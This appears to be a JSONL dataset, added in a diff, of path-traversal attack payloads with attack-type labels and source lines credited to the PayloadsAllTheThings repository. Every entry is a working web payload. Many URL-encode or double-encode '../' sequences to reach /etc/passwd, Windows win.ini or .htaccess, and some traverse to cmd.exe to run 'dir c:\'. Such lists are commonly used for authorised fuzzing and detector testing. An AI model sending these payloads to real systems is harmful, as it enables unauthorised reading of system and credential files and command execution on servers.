+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:26","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:27","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:28","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:29","license":"MIT"}
+{"payload":"\\..\\..\\..\\WINDOWS\\win.ini","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:3","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:30","license":"MIT"}
+{"payload":"%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:31","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:39","license":"MIT"}
+{"payload":"\\..\\..\\..\\..\\WINDOWS\\win.ini","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:4","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:40","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:41","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:42","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:43","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:44","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:45","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:46","license":"MIT"}
+{"payload":"%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:47","license":"MIT"}
+{"payload":"%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:48","license":"MIT"}
+{"payload":"%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:49","license":"MIT"}
+{"payload":"\\..\\..\\..\\..\\..\\WINDOWS\\win.ini","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:5","license":"MIT"}
+{"payload":"%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:50","license":"MIT"}
+{"payload":"../../../.htaccess","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:51","license":"MIT"}
+{"payload":"../../.htaccess","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:52","license":"MIT"}
+{"payload":"../.htaccess","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:53","license":"MIT"}
+{"payload":".htaccess","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:54","license":"MIT"}
+{"payload":"././.htaccess","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:55","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:56","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:57","license":"MIT"}
+{"payload":"%2e%2e%2f%2e%68%74%61%63%63%65%73%73","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:58","license":"MIT"}
+{"payload":"%2e%68%74%61%63%63%65%73%73","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:59","license":"MIT"}
+{"payload":"\\..\\..\\..\\..\\..\\..\\WINDOWS\\win.ini","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:6","license":"MIT"}
+{"payload":"%2e%2f%2e%2f%2e%68%74%61%63%63%65%73%73","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:60","license":"MIT"}
+{"payload":"%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:61","license":"MIT"}
+{"payload":"%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:62","license":"MIT"}
+{"payload":"%%32%65%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:63","license":"MIT"}
+{"payload":"%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:64","license":"MIT"}
+{"payload":"%%32%65%%32%66%%32%65%%32%66%%32%65%%36%38%%37%34%%36%31%%36%33%%36%33%%36%35%%37%33%%37%33","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:65","license":"MIT"}
+{"payload":"%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:7","license":"MIT"}
+{"payload":"%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:8","license":"MIT"}
+{"payload":"%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69","attack_type":"path-traversal","source":"swisskyrepo/PayloadsAllTheThings@3ac27901c711:Directory Traversal/Intruder/directory_traversal.txt:9","license":"MIT"}
